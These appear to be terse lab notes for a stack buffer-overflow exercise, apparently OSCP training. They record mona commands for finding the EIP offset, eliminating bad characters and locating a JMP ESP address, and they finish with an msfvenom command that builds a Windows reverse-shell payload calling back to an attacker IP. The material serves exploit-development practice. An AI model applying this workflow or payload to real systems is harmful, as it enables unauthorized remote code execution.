### Find EIP & offset
76413176
!mona findmsp -distance 1100

Log data, item 18
 Address=0BADF00D
 Message=    EIP contains normal pattern : 0x76413176 (offset 634)

verified with BBBB 424242 
done and done

### Bad Chars
##### Round 1
ESP 0022FA10
!mona compare -f C:\mona\oscp\bytearray.bin -a 0022FA10
x01

##### Round 2
!mona bytearray -b "\x00\x01"
ESP 019AFA30
!mona compare -f C:\mona\oscp\bytearray.bin -a 019AFA30

00 01 23 24 3c 3d 83 84 ba bb

##### Round 3
!mona bytearray -b "\x00\x01\x23\x3c\x83\xba"
ESP 01A0FA30
!mona compare -f C:\mona\oscp\bytearray.bin -a 01A0FA30

### JMP ESP
!mona jmp -r esp -cpb "\x00\x01\x23\x3c\x83\xba"

625011AF

\xaf\x11\x50\x62

### Generate Payload
msfvenom -p windows/shell_reverse_tcp LHOST=10.4.3.98 LPORT=2222 EXITFUNC=thread -b "\x00\x01\x23\x3c\x83\xba" -f c

### Tip
ran bad char triple times because of the \x00\x01